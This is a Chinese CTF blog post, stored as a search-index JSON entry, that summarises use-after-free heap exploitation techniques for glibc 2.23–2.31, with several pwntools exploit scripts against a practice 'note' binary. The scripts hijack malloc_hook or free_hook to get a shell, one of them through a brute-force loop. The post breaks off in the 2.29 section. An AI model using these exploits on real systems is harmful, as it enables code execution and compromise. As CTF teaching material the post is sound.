[{"title":"各版本UAF专场","url":"/2021/08/18/各版本UAF专场/","content":"\n一般来说UAF都是比较好利用的，尤其是在有tcache的版本下，2.32之前，没有对fd做任何检查，也没有对size做任何检查，那么直接改fd就能想申请哪儿就申请哪儿。但是这里就面临地址的问题，所以高版本下的UAF常常不会给你Show函数，通常结合FSOP来爆破泄露地址。而低版本的，没有tcache的时候，不给show函数会更加困难，因为fastbin attack会检查size位，通常还需要伪造。\n\n这里就2.23~2.31版本的UAF做个总结利用，各个条件的缩减。\n\n▲首先给出自己为了方便调试写的题，存在UAF，堆溢出，后门，malloc和calloc切换等多个漏洞，参考note题目：\n\n \n\n# 一、Glibc2.23\n\n## 1.UAF + Leak + Size不做限制：\n\n这种情况直接free进unsortedbin泄露地址，然后打fastbin attack，借助0x7f字节错位劫持malloc_hook即可，没啥技术含量。这里再说一些，其实0x56也是可以的，可以借助unsortedbin attack将堆地址写到一个地方然后字节错位也是可以的。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-16_15-16-03.png)\n\n0x7f：0111 1**11**1\n\n0x56：0101 0**11**0\n\n主要看的是AM位，加粗的两位，不能刚好是10，检测：\n\n(1)是否属于当前线程的main_arena\n\n(2)是否是mmap出来的chunk的检测\n\n所以按照道理来讲，尾数为4 5 c d四个系列不能通过检测，其他都可以的。而对于堆地址的随机性，0x56和0x55都是可能的，所以也不一定成功，同样需要爆破。\n\n```\n#注释头\n\none_gadget = getOnegadget()\nadd_malloc(0x418,'PIG007NB')\nadd_malloc(0x68,'PIG007NB')\nfree(1)\nshow(1)\nlibc_base = u64Leakbase(88 + libc.sym['main_arena'])\nlg(\"libc_base\",libc_base)\nfree(2)\nedit(2,0x8,p64(libc_base + libc.sym['__malloc_hook']-0x23))\nadd_malloc(0x68,'PIG007NB')\n\nfor i in range(len(one_gadget)):\n    lg(\"one_gadget[\"+str(i)+\"]\",libc_base+one_gadget[i])\nadd_malloc(0x68,'\\x00'*0x13+p64(libc_base+one_gadget[]))\n#add_malloc(0x18,'PIG007NB')\np.sendline('1')\np.sendline('1')\np.sendline('1')\np.interactive()\n```\n\n需要注意的是这里由于覆写了_IO_wide_data部分数据，有些数据可能打印不出来，直接一股脑发送信息申请堆块即可。至于one_gadget没办法用的，参照realloc_hook调整栈帧。\n\n## 2.UAF + Leak + size限制\n\n▲比如说size限制不能申请0x70大小的堆块，那么就没办法字节错位申请malloc_hook的地方。一般来说有以下几种情况：\n\n(1)只能是小Chunk，即0x20~0x80：\n\n泄露heap地址，修改FD，指向上一个chunk来修改size，释放进入unsortedbin后泄露得到libc地址，之后再借用0x7f的UAF字节错位申请即可到malloc_hook即可。\n\n(2)只能是中等的chunk，大于fatsbin小于largebin的，即0x90~0x3f0。\n\n泄露地址后，直接用unsortedbin attack，修改global_max_fast，然后利用fastbinY链在main_arean上留下size，申请过去修改top_chunk为malloc_hook-0x10或者malloc_hook-0x28，修复unsortedbin之后即可任意修改。\n\n```\n#注释头\n\none_gadget = getOnegadget()\nmain_arena = libc.sym['main_arena']\nfastbinsY = main_arena + 8\ntarget_addr = main_arena + 80\nidx = (target_addr - fastbinsY) / 8\nsize = idx * 0x10 + 0x20\n\n\nadd_malloc(size-0x8,'PIG007NB')\nadd_malloc(0x2f8,'PIG007NB')\nadd_malloc(size+0x10-0x8,'PIG007NB')\nadd_malloc(0xf8,'PIG007NB')\n\nfree(2)\nshow(2)\nlibc_base = u64Leakbase(unsortedBinIdx + libc.sym['main_arena'])\nlg(\"libc_base\",libc_base)\nmalloc_hook = libc_base + libc.sym['__malloc_hook']\nmain_arena = libc_base + libc.sym['main_arena']\ntarget_addr = libc_base+libc.sym['global_max_fast']\n\nedit(2,0x18,p64(0x0)+p64(target_addr-0x10))\nadd_malloc(0x2f8,'\\x00')\n\nfree(1)\nedit(1,0x8,p64(size+0x10+1))\nadd_malloc(size-0x8,'PIG007NB')\n\nfree(3)\nedit(3,0x8,p64(libc_base + libc.sym['main_arena'] + 0x48))\nadd_malloc(size+0x10-0x8,'PIG007NB')\nadd_malloc(size+0x10-0x8,p64(malloc_hook-0x28)+p64(0x0)+p64(main_arena+88)*2)\nadd_malloc(0x98,p64(0x0)*2+p64(libc_base + one_gadget[2])+p64(libc_base+libc.sym['realloc']+8))\np.sendline('1')\np.sendline('1')\np.sendline('1')\nit()\n```\n\n这里就利用realloc调整了一下栈帧\n\n(3)只能是大chunk，即0x400~...\n\n泄露地址后，直接用unsortedbin attack，修改global_max_fast，之后利用fastbinY机制可在free_hook附近伪造堆size，然后申请过去修改free_hook为system，释放堆块即可。\n\n```\n#注释头\n\nmain_arena = libc.sym['main_arena']\nfastbinsY = main_arena + 8\ntarget_addr_binsY = libc.sym['__free_hook']-0x10\nidx = (target_addr_binsY - fastbinsY) / 8\nsize = idx * 0x10 + 0x20\n\n\nadd_malloc(0x4f8,\"\\xaa\"*0x4f8)\t\t#idx1\nadd_malloc(0x4f8,'/bin/sh\\x00')\t\t#idx2\n\nadd_malloc(size-0x8,'PIG007NB')\t\t#idx3\nadd_malloc(size+0x10-0x8,'PIG007NB')\t#idx4\n\nfree(1)\nshow(1)\nlibc_base = u64Leakbase(unsortedBinIdx + libc.sym['main_arena'])\nlg(\"libc_base\",libc_base)\n\ntarget_addr = libc_base+libc.sym['global_max_fast']\nlog.info(\"target_addr:0x%x\"%target_addr)\n#change unsortedBinchunkA\n#chunkA.fd could be anything\n\nedit(1,0x4f8,p64(0x0)+p64(target_addr-0x10)) \n#have to malloc all from unsortedbin\nadd_malloc(0x4f8,\"\\xaa\"*0x4f8)\t\t#idx4\nfree(3)\nedit(3,0x8,p64(size+0x10+1))\nadd_malloc(size-0x8,'PIG007NB')\nfree(4)\nedit(4,0x8,p64(libc_base + target_addr_binsY -0x8))\nadd_malloc(size+0x10-0x8,'PIG007NB')\nadd_malloc(size+0x10-0x8,p64(0x0)+p64(libc_base + libc.sym['system']))\nfree(2)\nit()\n```\n\n(4)只能是某个特定大小的chunk，比如只能是0x40，0x60，一般不会只能是一个大小的，不然基本无法利用。\n\n泄露地址heap地址后，修改size位进入unsortedbin中，再泄露libc地址。由于无法0x56和0x7f字节错位利用，所以只能利用一个size的bin，释放之后在fastbinY中留下size，然后另一个size申请过去，修改top_chunk到malloc_hook处即可，之后类似。\n\n详情参照CISCN东北赛区复现中的题目small_chunk。\n\n## 3.UAF + 无Leak + Size不做限制\n\n▲无Leak通常需要爆破，同样用unsortedbin attack部分写unsortedbin中chunk的bk指针，修改global_max_fast，之后利用fastbinY机制劫持_IO_2_1_stdout_结构体，泄露出地址，然后就和之前一样，再利用fastbinY机制劫持free_hook即可。\n\n```\n#注释头\n\ndef pwn():\n\t#one_gadget = getOnegadget()\n\theap_base = leak_heap()\n\tlibc_base = leak_libc() - libc.sym['printf']\n\telf_base = leak_elf() - elf.sym['main']\n\tlog.info(\"heap_base:0x%x\"%heap_base)\n\tlog.info(\"libc_base:0x%x\"%libc_base)\n\tlog.info(\"elf_base:0x%x\"%elf_base)\n\n\tadd_malloc(0x1000-0x8,'PIG007NB')\n\n\t#prepare data-----------------------------------------------------------\n\tguess_libc = 0x9000\n\tguess_heap = 0x2000\n\tfastbinsY = guess_libc + libc.sym['main_arena'] + 8\n\t_IO_read_end = guess_libc + libc.sym['_IO_2_1_stdout_'] + 0x10\n\t_IO_write_base = guess_libc + libc.sym['_IO_2_1_stdout_'] + 0x20\n\t_IO_write_ptr = guess_libc + libc.sym['_IO_2_1_stdout_'] + 0x28\n\t_IO_write_end = guess_libc + libc.sym['_IO_2_1_stdout_'] + 0x30\n\n\tidx_read_end = (_IO_read_end - fastbinsY) / 8\n\tsize_read_end = idx_read_end * 0x10 + 0x20\n\n\tidx_write_base = (_IO_write_base - fastbinsY) / 8\n\tsize_write_base = idx_write_base * 0x10 + 0x20\n\n\tidx_write_ptr = (_IO_write_ptr - fastbinsY) / 8\n\tsize_write_ptr = idx_write_ptr * 0x10 + 0x20\n\n\tidx_write_end = (_IO_write_end - fastbinsY) / 8\n\tsize_write_end = idx_write_end * 0x10 + 0x20\n\n\ttarget_addr_gMF = guess_libc + libc.sym['global_max_fast']\n\n\tfastbinsY = libc.sym['main_arena'] + 8\n\ttarget_addr_binsY = libc.sym['__free_hook']-0x10\n\tidx_free_hook = (target_addr_binsY - fastbinsY) / 8\n\tsize_free_hook = idx_free_hook * 0x10 + 0x20\n\n\t#read_end-------------------------------------------------------------\n\tadd_malloc(0x38,\"\\x00\"*0x38)\t\t\t\t#idx\t0x1\n\tadd_malloc(0x38,\"\\x00\"*0x38)\t\t\t\t#idx\t0x2  point free  read_end\n\tadd_malloc(0x38,\"\\x03\"*0x38)\t\t\t\t#idx\t0x3\n\tadd_malloc(0x38,'\\x04'*0x18+p64(0x21)+'\\x04'*0x18)\t\t#idx\t0x4\n\n\tfree(0x1)\n\t#free(2)\n\tfree(0x3)\n\tedit(0x3,0x1,'\\x20')\n\tedit(0x1,0x20,p64(0x0)*3+p64(0x41))\n\n\tadd_malloc(0x38,'\\x05'*0x18+p64(0x21)+'\\x05'*0x18)\t\t\t\t#idx\t0x5\n\tadd_malloc(0x38,'\\x06'*0x18)\t\t\t\t\t\t\t\t\t#idx\t0x6 #point change size\n\t#---------------------------------------------------------------------\n\n\n\t#write_end can not be so far from wirte_base\n\tadd_malloc(size_write_end-0x8,(p64(0x0)+p64(0x21))*((size_write_end-0x10)/0x10))\t\t\t\t#idx\t0x7\n\tadd_malloc(size_write_ptr-0x8,(p64(0x0)+p64(0x21))*((size_write_ptr-0x10)/0x10))\t\t\t\t#idx\t0x8\n\n\n\t#write_base-----------------------------------------------------------\n\tadd_malloc(0x38,\"\\x00\"*0x38)\t\t\t\t#idx\t0x9\n\tadd_malloc(0x38,\"\\xaa\"*0x38)\t\t\t\t#idx\t0xa\n\tadd_malloc(0x38,\"\\x0b\"*0x38)\t\t\t\t#idx\t0xb\n\tadd_malloc(0x38,'\\x0c'*0x18+p64(0x21)+'\\xaa'*0x18)\t\t#idx\t0xc\n\n\tfree(0x9)\n\t#free(2)\n\tfree(0xb)\n\tedit(0xb,0x2,p16((guess_heap+0x1000+0x40)&0xffff))\n\tedit(0x9,0x20,p64(0x0)*3+p64(0x41))\n\n\tadd_malloc(0x38,'\\x0d'*0x18+p64(0x21)+'\\x05'*0x18)\t\t\t\t#idx\t0xd\n\tadd_malloc(0x38,'\\x0e'*0x18)\t\t\t\t\t\t\t\t\t#idx\t0xe #point free\n\t#---------------------------------------------------------------------\n\n\n\n\t#prepare for free_hook\n\tadd_malloc(size_free_hook-0x8,'PIG007NB')\t\t\t#idxf\n\tadd_malloc(size_free_hook+0x10-0x8,'PIG007NB')\t\t#idx10\n\n\n\t#unsortedbin attack\n\tadd_malloc(0x4f8,'\\x11'*0x4f8)\t\t\t#idx 0x11\n\tadd_malloc(0x38,'\\x12'*0x38)\t\t\t#idx 0x12\n\tfree(0x11)\n\tedit(0x11,0x8+0x2,p64(0x0)+p16((target_addr_gMF&0xffff)-0x10))\n\tadd_malloc(0x4f8,'/bin/sh\\x00')\t\t\t#idx 0x13\n\n\n\n\t#change write_base \n\tedit_m(0x6,0x20,p64(0x0)*3+p64(size_write_base+1))\n\tfree_m(0xe)\n\n\n\t#change write_end and write_ptr\n\tfree_m(0x7)\n\tfree_m(0x8)\n\n\n\t#change read_end\n\tedit_m(0x6,0x20,p64(0x0)*3+p64(size_read_end+1))\n\tfree_m(0x2)\n\n\tlibc_base = u64Leakbase(libc.sym['_IO_2_1_stdout_']+131)\n\tlg(\"libc_base\",libc_base)\n\n\t#write free_hook - 0x10\n\tfree(0xf)\n\n\t#left size\n\tedit(0xf,0x8,p64(size_free_hook+0x10+1))\n\tadd_malloc(size_free_hook-0x8,'PIG007NB')\n\n\t#get free_hook - 0x8\n\tfree(0x10)\n\tedit(0x10,0x8,p64(libc_base + target_addr_binsY -0x8))\n\tadd_malloc(size_free_hook+0x10-0x8,'PIG007NB')\n\tadd_malloc(size_free_hook+0x10-0x8,p64(0x0)+p64(libc_base + libc.sym['system']))\n\n\t#get shell\n\tfree(0x13)\n\tit()\n\n\n\n\n\ni = 0\nwhile True:\n\ti = i + 1\n\ttry:\n\t\tp = process(\"./note\")\n\t\tlg(\"Times:\",i)\n\t\tpwn()\n\texcept EOFError:\n\t\tp.close()\n\t\tcontinue\n\telse:\n\t\tp.interactive()\n\t\tbreak\n```\n\n▲通常需要注意的是，write_base和write_end不能相距太远，不然很容易数据量过大而崩溃。还有这里最后泄露地址是\n\nlibc_base = u64Leakbase(libc.sym['_IO_2_1_stdout_']+131)\n\n这是因为IO流的机制，会在写入数据的0x10处上写下libc.sym['_IO_2_1_stdout_']+131的地址，所以这里直接就能泄露。\n\n▲题外话：爆破的数学期望为1/256\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-17_18-07-31.png)\n\n## 4.UAF + 无Leak + Size做限制\n\n▲同样size做限制一般也分为以下几种\n\n(1)只能是小Chunk，即0x20~0x80：\n\n这个也是一样的，利用UAF部分写入heap_addr制造堆块重叠，修改size域，放入unsortedbin，然后部分写入libc_addr打unsortedbin attack修改global_max_fast，之后就类似了，劫持_IO_2_1_stdout泄露地址，fastbinY机制劫持main_arena，修复unsortedbin后改top_chunk劫持malloc_hook即可。\n\n(2)只能是中等的chunk，大于fatsbin小于largebin的，即0x90~0x3f0。\n\n类似，部分写修改size域打unsortedbin attack，修改global_max_fast，劫持_IO_2_1_stdout泄露地址。fastbinY机制劫持free_hook。\n\n(3)只能是大chunk，即0x400~...\n\n直接用部分写libc_addr打unsortedbin attack，修改global_max_fast，劫持_IO_2_1_stdout泄露地址，之后利用fastbinY机制可在free_hook附近伪造堆size，然后申请过去修改free_hook为system，释放堆块即可。\n\n(4)指定的chunk size。\n\n▲其实对于UAF来说，size做没做限制都差不了太多，因为都可以部分写堆块地址制造堆重叠，然后就能修改size域，唯一区分的就是申请时候的限制，小的就打top_chunk，大的就直接打_free_hook。比较有意思的一点就是限制特定size，一般限制为两个，以前遇到0x20和0x30，也有0x40和0x50的，都是大同小异，借用fastbinY机制留下size后申请过去即可。\n\n \n\n# 二、Glibc2.27\n\nUAF在这个版本下对于tcache实在是好用，再加上传统的unsortedbin attck还没有失效，分分钟就能出来，不讲了。\n\n \n\n# 三、Glibc2.29\n\n这个版本下的unsortedbin attck已经失效，原因是","categories":["pwn堆-UAF"]}]